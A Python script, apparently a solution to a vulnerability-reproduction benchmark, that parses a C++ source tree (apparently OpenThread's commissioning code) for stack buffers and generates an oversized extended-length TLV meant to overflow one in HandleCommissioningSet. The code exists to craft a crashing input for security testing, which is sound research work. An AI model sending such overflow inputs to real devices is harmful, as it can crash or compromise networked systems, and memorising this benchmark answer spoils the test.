import os
import re
import tarfile
import ast
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = self._load_source_files(src_path)

        sanitized_files = {k: self._sanitize_cpp(v) for k, v in files.items()}

        endian = self._detect_extended_length_endianness(files)

        # Pre-collect simple numeric constants from #define and constexpr/static-const patterns
        constants = {}
        for text in files.values():
            self._collect_simple_constants(text, constants)

        # Analyze HandleCommissioningSet for likely overflow destination
        best = self._find_best_overflow_candidate(files, sanitized_files, constants)

        # Choose TLV type
        tlv_type_name = None
        if best and best[0]:
            tlv_type_name = best[0]

        # Resolve type numeric value
        tlv_type = None
        if tlv_type_name:
            tlv_type = self._resolve_constant_value(tlv_type_name, files, sanitized_files, constants)

        # Fallback to common commissioner dataset TLV types
        if tlv_type is None:
            for name in ("kCommissionerId", "kSteeringData", "kProvisioningUrl", "kJoinerUdpPort", "kBorderAgentLocator"):
                v = self._resolve_constant_value(name, files, sanitized_files, constants)
                if v is not None and 0 <= v <= 255:
                    tlv_type = v
                    break

        if tlv_type is None:
            tlv_type = 0x0b  # common Commissioner ID TLV

        # Decide extended length
        if best:
            _, dest_size, kind = best
            ext_len = self._choose_ext_len(dest_size, kind)
        else:
            ext_len = 840  # 844 bytes total, matches known crashing size

        # Build extended TLV: Type (1), Length=0xFF (1), ExtLen (2), Value (ExtLen)
        ext_len = int(ext_len)
        if ext_len < 0:
            ext_len = 840
        if ext_len > 65535:
            ext_len = 65535

        if endian == "little":
            ext_bytes = ext_len.to_bytes(2, "little")
        else:
            ext_bytes = ext_len.to_bytes(2, "big")

        value = b"A" * ext_len
        poc = bytes([tlv_type & 0xFF, 0xFF]) + ext_bytes + value
        return poc

    def _choose_ext_len(self, dest_size: int, kind: str) -> int:
        try:
            ds = int(dest_size)
        except Exception:
            return 840
        if ds <= 0:
            return 840

        # Use >=255 to avoid any potential "extended TLV only for >=255" strictness
        if kind == "GetSize":
            # Copy length includes header (4 bytes for extended TLV)
            needed_total = ds + 1
            ext_len = needed_total - 4
            if ext_len < 0:
                ext_len = 0
            if ext_len < 255:
                ext_len = 255
            return ext_len
        else:
            ext_len = ds + 1
            if ext_len < 255:
                ext_len = 255
            return ext_len

    def _find_best_overflow_candidate(
        self,
        files: Dict[str, str],
        sanitized_files: Dict[str, str],
        constants: Dict[str, int],
    ) -> Optional[Tuple[str, int, str]]:
        # Try to locate the real HandleCommissioningSet and find stack arrays used as copy destinations.
        candidates = []

        for path, stext in sanitized_files.items():
            if "HandleCommissioningSet" not in stext:
                continue
            for body in self._extract_function_bodies(stext, "HandleCommissioningSet"):
                local_arrays = self._find_local_arrays(body, constants)
                if not local_arrays:
                    continue
                # Scan line-by-line, track current case label in switch
                curr_case = None
                for line in body.splitlines():
                    mcase = re.search(r"\bcase\s+([^:]+)\s*:", line)
                    if mcase:
                        curr_case = mcase.group(1).strip()
                    if "memcpy" in line or ".Read" in line or ".ReadBytes" in line or "memmove" in line:
                        dest, len_expr = self._extract_copy_dest_and_len(line)
                        if not dest or not len_expr:
                            continue
                        if dest not in local_arrays:
                            # might be "&buf" etc
                            if dest.startswith("&") and dest[1:] in local_arrays:
                                dest_key = dest[1:]
                            else:
                                continue
                        else:
                            dest_key = dest
                        if ("GetLength" not in len_expr) and ("GetSize" not in len_expr):
                            continue
                        kind = "GetSize" if "GetSize" in len_expr else "GetLength"
                        dest_size = local_arrays.get(dest_key)
                        if not isinstance(dest_size, int) or dest_size <= 0:
                            continue
                        # Pick a TLV type token from case expression if present
                        tname = self._token_to_const_name(curr_case) if curr_case else ""
                        if not tname:
                            # try to infer from line: looks like "kFoo" present
                            km = re.search(r"\b(k[A-Za-z0-9_]+)\b", line)
                            if km:
                                tname = km.group(1)
                        if not tname:
                            continue
                        # Compute output length for selection: 4 + ext_len
                        ext_len = self._choose_ext_len(dest_size, kind)
                        out_len = 4 + ext_len
                        candidates.append((out_len, tname, dest_size, kind))

        if not candidates:
            return None

        candidates.sort(key=lambda x: x[0])
        _, tname, dest_size, kind = candidates[0]
        return (tname, dest_size, kind)

    def _token_to_const_name(self, token: str) -> str:
        if not token:
            return ""
        token = token.strip()
        token = re.sub(r"\b(static_cast|reinterpret_cast|const_cast|dynamic_cast)\s*<[^>]+>\s*\(", "(", token)
        # Common patterns: Namespace::Class::kName or kName
        m = re.search(r"\b(k[A-Za-z0-9_]+)\b", token)
        return m.group(1) if m else ""

    def _extract_copy_dest_and_len(self, line: str) -> Tuple[Optional[str], Optional[str]]:
        # memcpy(dest, src, len)
        m = re.search(r"\bmemcpy\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\)", line)
        if m:
            dest = self._normalize_ident(m.group(1))
            ln = m.group(3).strip()
            return dest, ln
        m = re.search(r"\bmemmove\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\)", line)
        if m:
            dest = self._normalize_ident(m.group(1))
            ln = m.group(3).strip()
            return dest, ln

        # aMessage.Read(off, dest, len) or ReadBytes(off, dest, len)
        m = re.search(r"\.\s*Read(?:Bytes)?\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\)", line)
        if m:
            dest = self._normalize_ident(m.group(2))
            ln = m.group(3).strip()
            return dest, ln

        return None, None

    def _normalize_ident(self, s: str) -> str:
        s = s.strip()
        s = re.sub(r"\s+", "", s)
        # strip casts and parentheses
        s = re.sub(r"^\(+", "", s)
        s = re.sub(r"\)+$", "", s)
        # Keep leading '&' if present; caller may handle
        # Reduce expressions like '&buf[0]' to '&buf'
        s = re.sub(r"\[(.*?)\]$", "", s)
        s = re.sub(r"\.(.*)$", "", s)  # buf.data -> buf
        s = re.sub(r"->(.*)$", "", s)
        return s

    def _find_local_arrays(self, func_body: str, constants: Dict[str, int]) -> Dict[str, int]:
        arrays = {}
        # Very permissive: uint8_t buf[SIZE];
        decl_re = re.compile(
            r"\b(?:uint8_t|int8_t|char|unsignedchar|uint16_t|uint32_t|uint64_t|int|unsigned|size_t)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;",
            re.MULTILINE,
        )
        for m in decl_re.finditer(func_body):
            name = m.group(1)
            size_expr = m.group(2).strip()
            size = self._eval_c_int_expr(size_expr, constants)
            if isinstance(size, int) and size > 0 and size <= 1_000_000:
                arrays[name] = size
        return arrays

    def _extract_function_bodies(self, sanitized_text: str, func_name: str) -> List[str]:
        bodies = []
        # Find occurrences of func name followed by '('
        for m in re.finditer(r"\b" + re.escape(func_name) + r"\s*\(", sanitized_text):
            start = m.start()
            # Find '{' after signature
            brace_pos = sanitized_text.find("{", m.end())
            if brace_pos == -1:
                continue
            body, end = self._extract_brace_block(sanitized_text, brace_pos)
            if body:
                bodies.append(body)
        return bodies

    def _extract_brace_block(self, text: str, open_brace_pos: int) -> Tuple[Optional[str], int]:
        if open_brace_pos < 0 or open_brace_pos >= len(text) or text[open_brace_pos] != "{":
            return None, open_brace_pos
        depth = 0
        i = open_brace_pos
        n = len(text)
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[open_brace_pos + 1 : i], i + 1
            i += 1
        return None, n

    def _detect_extended_length_endianness(self, files: Dict[str, str]) -> str:
        # Heuristic: if TLV GetLength uses LittleEndian::ReadUint16, pick little; else big.
        combined_hits = []
        for path, text in files.items():
            if "kExtendedLength" in text or "ExtendedLength" in text or "GetLength" in text:
                combined_hits.append(text)
        hay = "\n".join(combined_hits)
        if re.search(r"LittleEndian::ReadUint16", hay):
            return "little"
        if re.search(r"BigEndian::ReadUint16", hay):
            return "big"
        return "big"

    def _collect_simple_constants(self, text: str, constants: Dict[str, int]) -> None:
        # #define NAME value
        for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+([0-9xXa-fA-F][0-9xXa-fA-FuUlL]*)\b", text):
            name = m.group(1)
            val = self._eval_c_int_expr(m.group(2), constants)
            if isinstance(val, int):
                constants.setdefault(name, val)

        # static constexpr ... NAME = value;
        for m in re.finditer(
            r"(?m)^\s*(?:static\s+)?(?:constexpr|const)\s+(?:[\w:<>]+\s+)+([A-Za-z_]\w*)\s*=\s*([^;]+);",
            text,
        ):
            name = m.group(1)
            expr = m.group(2).strip()
            if "{" in expr or "}" in expr or "sizeof" in expr:
                continue
            val = self._eval_c_int_expr(expr, constants)
            if isinstance(val, int):
                constants.setdefault(name, val)

    def _resolve_constant_value(
        self,
        name: str,
        files: Dict[str, str],
        sanitized_files: Dict[str, str],
        constants: Dict[str, int],
    ) -> Optional[int]:
        if not name:
            return None
        base = name.split("::")[-1]
        if base in constants and isinstance(constants[base], int):
            v = constants[base]
            if 0 <= v <= 0xFFFFFFFF:
                return v

        # Direct assignment patterns in raw files
        assign_re = re.compile(r"\b" + re.escape(base) + r"\b\s*=\s*([^,}\n]+)")
        for text in files.values():
            if base not in text:
                continue
            for m in assign_re.finditer(text):
                expr = m.group(1).strip()
                if "sizeof" in expr:
                    continue
                v = self._eval_c_int_expr(expr, constants)
                if isinstance(v, int):
                    constants[base] = v
                    return v

        # Try to resolve within enum block by locating an enum that contains the token
        for path, stext in sanitized_files.items():
            if base not in stext:
                continue
            idx = stext.find(base)
            if idx == -1:
                continue
            # Find nearest 'enum' keyword before idx
            enum_pos = stext.rfind("enum", 0, idx)
            if enum_pos == -1:
                continue
            # Find '{' after enum_pos and ensure it's before idx
            open_brace = stext.find("{", enum_pos, idx + 200)
            if open_brace == -1:
                continue
            # Extract enum body
            enum_body, _ = self._extract_brace_block(stext, open_brace)
            if not enum_body:
                continue
            ev = self._parse_enum_value(enum_body, base, constants)
            if ev is not None:
                constants[base] = ev
                return ev

        return None

    def _parse_enum_value(self, enum_body: str, target: str, constants: Dict[str, int]) -> Optional[int]:
        # Split by commas at top level (no braces expected in sanitized enum body)
        parts = enum_body.split(",")
        current = -1
        local = dict(constants)
        for part in parts:
            item = part.strip()
            if not item:
                continue
            # Remove attributes like OT_TOOL_PACKED_FIELD or [[...]] if any
            item = re.sub(r"\[\[.*?\]\]", "", item).strip()
            # Match NAME = expr or NAME
            m = re.match(r"^([A-Za-z_]\w*)\s*(?:=\s*(.*))?$", item)
            if not m:
                continue
            name = m.group(1)
            expr = m.group(2).strip() if m.group(2) is not None else None
            if expr:
                val = self._eval_c_int_expr(expr, local)
                if not isinstance(val, int):
                    # if can't eval, skip but keep sequencing best-effort
                    current = current + 1
                    local[name] = current
                else:
                    current = val
                    local[name] = current
            else:
                current = current + 1
                local[name] = current

            if name == target:
                return local[name]
        return None

    def _eval_c_int_expr(self, expr: str, constants: Dict[str, int]) -> Optional[int]:
        if expr is None:
            return None
        s = expr.strip()
        if not s:
            return None
        # Strip casts/macros commonly used
        s = re.sub(r"\b(static_cast|reinterpret_cast|const_cast|dynamic_cast)\s*<[^>]+>\s*\(", "(", s)
        s = re.sub(r"\b(UINT8_C|UINT16_C|UINT32_C|UINT64_C)\s*\(", "(", s)
        # Remove C++ scope qualifiers in known constants replacement stage
        # Remove suffixes on integer literals
        s = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)[uUlL]+", "", s)
        s = re.sub(r"(?<=\b\d+)[uUlL]+", "", s)
        # Replace identifiers with known constants
        def repl_ident(m):
            name = m.group(0)
            if name in constants and isinstance(constants[name], int):
                return str(constants[name])
            return name

        s2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_ident, s)
        # Reject if still contains sizeof or braces
        if "sizeof" in s2 or "{" in s2 or "}" in s2:
            return None

        # Only allow a safe subset of characters
        if re.search(r"[^0-9xXa-fA-F\(\)\s\+\-\*/%<>&\|\^~]", s2):
            return None

        try:
            node = ast.parse(s2, mode="eval")
            if not self._is_safe_ast(node):
                return None
            val = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
            if isinstance(val, bool):
                val = int(val)
            if isinstance(val, int):
                return val
            return None
        except Exception:
            return None

    def _is_safe_ast(self, node: ast.AST) -> bool:
        allowed = (
            ast.Expression,
            ast.BinOp,
            ast.UnaryOp,
            ast.Constant,
            ast.Add,
            ast.Sub,
            ast.Mult,
            ast.FloorDiv,
            ast.Div,
            ast.Mod,
            ast.BitOr,
            ast.BitAnd,
            ast.BitXor,
            ast.LShift,
            ast.RShift,
            ast.Invert,
            ast.UAdd,
            ast.USub,
            ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
        )
        for n in ast.walk(node):
            if isinstance(n, ast.Name):
                return False
            if isinstance(n, ast.Call):
                return False
            if isinstance(n, ast.Attribute):
                return False
            if isinstance(n, ast.Subscript):
                return False
            if not isinstance(n, allowed):
                # Allow Load context nodes in some Python versions
                if n.__class__.__name__ in ("Load",):
                    continue
                return False
        return True

    def _load_source_files(self, src_path: str) -> Dict[str, str]:
        files = {}

        def add_file(rel: str, data: bytes):
            # Keep only likely source files; but include fuzz/test sources
            lower = rel.lower()
            if not any(lower.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".inc", ".ipp")):
                return
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            files[rel] = text

        if os.path.isdir(src_path):
            for root, _, fnames in os.walk(src_path):
                for fn in fnames:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, src_path)
                    try:
                        with open(full, "rb") as f:
                            data = f.read()
                        add_file(rel, data)
                    except Exception:
                        continue
            return files

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isreg():
                            continue
                        rel = m.name
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        add_file(rel, data)
            except Exception:
                pass
            return files

        # Fallback: treat as a plain file
        try:
            with open(src_path, "rb") as f:
                data = f.read()
            add_file(os.path.basename(src_path), data)
        except Exception:
            pass
        return files

    def _sanitize_cpp(self, text: str) -> str:
        # Remove comments and replace string/char literals with spaces to simplify parsing.
        out = []
        i = 0
        n = len(text)
        state = "code"
        while i < n:
            c = text[i]
            if state == "code":
                if c == "/" and i + 1 < n and text[i + 1] == "/":
                    state = "line_comment"
                    out.append("  ")
                    i += 2
                    continue
                if c == "/" and i + 1 < n and text[i + 1] == "*":
                    state = "block_comment"
                    out.append("  ")
                    i += 2
                    continue
                if c == '"':
                    state = "string"
                    out.append(" ")
                    i += 1
                    continue
                if c == "'":
                    state = "char"
                    out.append(" ")
                    i += 1
                    continue
                out.append(c)
                i += 1
            elif state == "line_comment":
                if c == "\n":
                    state = "code"
                    out.append("\n")
                else:
                    out.append(" ")
                i += 1
            elif state == "block_comment":
                if c == "*" and i + 1 < n and text[i + 1] == "/":
                    state = "code"
                    out.append("  ")
                    i += 2
                else:
                    out.append(" " if c != "\n" else "\n")
                    i += 1
            elif state == "string":
                if c == "\\" and i + 1 < n:
                    out.append("  ")
                    i += 2
                    continue
                if c == '"':
                    state = "code"
                    out.append(" ")
                    i += 1
                else:
                    out.append(" " if c != "\n" else "\n")
                    i += 1
            elif state == "char":
                if c == "\\" and i + 1 < n:
                    out.append("  ")
                    i += 2
                    continue
                if c == "'":
                    state = "code"
                    out.append(" ")
                    i += 1
                else:
                    out.append(" " if c != "\n" else "\n")
                    i += 1
        return "".join(out)